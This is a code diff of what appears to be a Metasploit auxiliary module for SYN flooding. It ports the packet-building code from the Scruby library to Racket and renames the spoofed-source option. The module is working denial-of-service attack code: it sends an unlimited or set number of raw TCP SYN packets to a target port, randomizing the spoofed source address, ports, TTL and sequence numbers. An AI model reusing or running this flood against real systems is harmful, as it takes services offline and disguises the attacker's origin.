@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'scruby'
+require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			Opt::RPORT(80),
-			OptAddress.new('LHOST', [false, 'The spoofable source address (else randomizes)']),
+			OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
 			OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
 		])
 	end
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def srchost
-		datastore['LHOST'] || [rand(0xff), rand(0xff), rand(0xff), rand(0xff)].join(".")
+		datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
 	end
 
 	def run
@@ -49,23 +49,28 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("SYN flooding #{rhost}:#{rport}...")
 
+		n = Racket::Racket.new
+		n.l3 = Racket::IPv4.new
+		n.l3.dst_ip = rhost
+		n.l3.protocol = 6
+		n.l4 = Racket::TCP.new
+		n.l4.src_port = rand(65535)+1
+		n.l4.dst_port = rport
+		n.l4.flag_syn = 1
+		n.l4.ack = 0
+
 		while (num <= 0) or (sent < num)
-			pkt = (
-				Scruby::IP.new(
-					:src   => srchost,
-					:dst   => rhost,
-					:proto => 6,
-					:len   => 40,
-					:id    => rand(0xffff)
-				) / Scruby::TCP.new(
-					# We could use a privileged port here
-					# since we're root using a raw socket
-					# but it doesn't really matter
-					:sport => rand(0xffff - 1025) + 1025,
-					:dport => rport,
-					:seq   => rand(0xffffffff)
-				)
-			).to_net
+
+			n.l3.src_ip = srchost		
+			n.l3.id = rand(0x10000)
+			n.l3.ttl = rand(128)+128		
+			n.l4.window   = rand(4096)+1
+			n.l4.src_port = rand(65535)+1
+			n.l4.seq  = rand(0x100000000)
+
+			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	
+
+			pkt = n.pack
 
 			ip_write(pkt)
 
